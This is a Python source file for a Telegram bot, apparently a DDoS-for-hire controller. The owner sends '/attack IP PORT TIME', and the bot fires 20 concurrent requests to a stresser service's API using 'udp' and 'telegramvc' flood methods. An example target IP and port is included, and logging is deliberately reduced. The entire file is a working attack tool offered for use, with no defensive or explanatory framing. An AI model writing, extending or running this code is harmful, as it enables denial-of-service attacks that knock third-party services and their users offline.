# app.py - API ONLY (No UDP Fallback)
import os
import logging
import asyncio
import threading
import aiohttp
import time
from datetime import datetime
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 20

# ===== REDUCED LOGGING =====
logging.basicConfig(
    level=logging.ERROR,
    format='%(asctime)s - %(levelname)s - %(message)s',
)

# Disable all verbose logging
logging.getLogger("httpx").setLevel(logging.ERROR)
logging.getLogger("httpcore").setLevel(logging.ERROR)
logging.getLogger("telegram").setLevel(logging.ERROR)
logging.getLogger("asyncio").setLevel(logging.ERROR)

# ===== FLASK APP =====
flask_app = Flask(__name__)

# Disable Flask logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@flask_app.route('/')
def index():
    return "🤖 API Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== API ATTACK ONLY =====
async def api_attack(target, port, duration, attack_id):
    """API ONLY - No UDP Fallback"""
    url = "https://api.susstresser.com/panel/api/api.php"
    
    # Try both methods
    methods = ["udp", "telegramvc"]
    
    for method in methods:
        params = {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": method
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive"
        }
        
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                start_time = time.time()
                async with session.get(url, params=params, headers=headers) as response:
                    elapsed = time.time() - start_time
                    result_text = await response.text()
                    
                    if response.status == 200:
                        return {
                            "success": True,
                            "attack_id": attack_id,
                            "method": method,
                            "status": response.status,
                            "elapsed": f"{elapsed:.2f}s",
                            "response": result_text[:100] if result_text else "Success"
                        }
                    else:
                        return {
                            "success": False,
                            "attack_id": attack_id,
                            "method": method,
                            "status": response.status,
                            "elapsed": f"{elapsed:.2f}s",
                            "response": result_text[:100] if result_text else "Failed"
                        }
                        
        except Exception as e:
            return {
                "success": False,
                "attack_id": attack_id,
                "method": method,
                "error": str(e)
            }
    
    return {
        "success": False,
        "attack_id": attack_id,
        "error": "All methods failed"
    }

# ===== 20 CONCURRENT API ATTACKS =====
async def start_20_api_attacks(target, port, duration):
    """Launch 20 concurrent API attacks"""
    
    tasks = []
    for i in range(1, 21):
        task = api_attack(target, port, duration, i)
        tasks.append(task)
    
    results = await asyncio.gather(*tasks)
    success_count = sum(1 for r in results if r.get('success', False))
    
    return {
        "success": success_count > 0,
        "total_attacks": len(results),
        "successful": success_count,
        "failed": len(results) - success_count,
        "results": results
    }

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")],
    ]
    
    await update.message.reply_text(
        "⚡ *API ATTACK BOT*\n\n"
        "🔥 20 Concurrent API Attacks\n"
        "💪 API ONLY - No UDP Fallback\n\n"
        "Send: `/attack IP PORT TIME`\n"
        "Example: `/attack 91.108.13.37 32001 60`\n\n"
        "⏱️ Time: 60-300 seconds",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can use /attack.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ Usage: `/attack IP PORT TIME`\n"
            "Example: `/attack 91.108.13.37 32001 60`",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 *API ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"⚡ Attacks: `20 CONCURRENT`\n"
            f"🔑 API: `{API_KEY[:10]}...`\n\n"
            f"⏳ Sending 20 API attacks...",
            parse_mode='Markdown'
        )
        
        result = await start_20_api_attacks(target, port, duration)
        
        if result.get('success'):
            response_text = (
                f"✅ *API ATTACK SUCCESSFUL!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                f"❌ Failed: `{result['failed']}`\n"
                f"⚡ Status: ✅ SUCCESS\n\n"
                f"📊 *Attack Results:*\n"
            )
            
            for r in result['results'][:10]:
                status = "✅" if r.get('success') else "❌"
                method = r.get('method', 'N/A')
                status_code = r.get('status', 'N/A')
                elapsed = r.get('elapsed', 'N/A')
                response_text += f"{status} Attack {r.get('attack_id', 'N/A')}: {method} - {status_code} ({elapsed})\n"
            
            if len(result['results']) > 10:
                response_text += f"... and {len(result['results']) - 10} more\n"
        else:
            response_text = (
                f"❌ *API ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Status: ❌ FAILED\n\n"
                f"💡 Check API key or connection."
            )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
    except ValueError:
        await update.message.reply_text("❌ Invalid port or time! Use numbers.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "💥 *API ATTACK*\n\n"
        "Send: `IP PORT TIME`\n"
        "Example: `91.108.13.37 32001 60`\n\n"
        "⏱️ Time: 60-300 seconds\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only owner can attack.")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 *API ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}`\n"
            f"📡 Port: `{port}`\n"
            f"⏱️ Time: `{duration}s`\n"
            f"⚡ Attacks: `20 CONCURRENT`\n\n"
            f"⏳ Sending API attacks...",
            parse_mode='Markdown'
        )
        
        result = await start_20_api_attacks(target, port, duration)
        
        if result.get('success'):
            response_text = (
                f"✅ *API ATTACK SUCCESSFUL!*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                f"⚡ Status: ✅ SUCCESS"
            )
        else:
            response_text = (
                f"❌ *API ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}`\n"
                f"📡 Port: `{port}`\n"
                f"⏱️ Time: `{duration}s`\n"
                f"📊 Status: ❌ FAILED"
            )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📊 *BOT STATUS*\n\n"
        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
        f"🌐 Status: ONLINE\n"
        f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
        f"💪 Method: API ONLY\n\n"
        f"📌 /attack IP PORT TIME",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")],
    ]
    
    await query.edit_message_text(
        "⚡ *API ATTACK BOT*\n\n"
        "🔥 20 Concurrent API Attacks\n"
        "💪 API ONLY - No UDP Fallback\n\n"
        "Send: `/attack IP PORT TIME`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== RUN BOT =====
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(status_callback, pattern="^status$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    print("✅ Bot started - API ONLY mode!")
    loop.run_forever()

if __name__ == "__main__":
    print("=" * 50)
    print("⚡ API ATTACK BOT")
    print("🔥 20 Concurrent API Attacks")
    print("💪 API ONLY - No UDP Fallback")
    print("=" * 50)
    
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
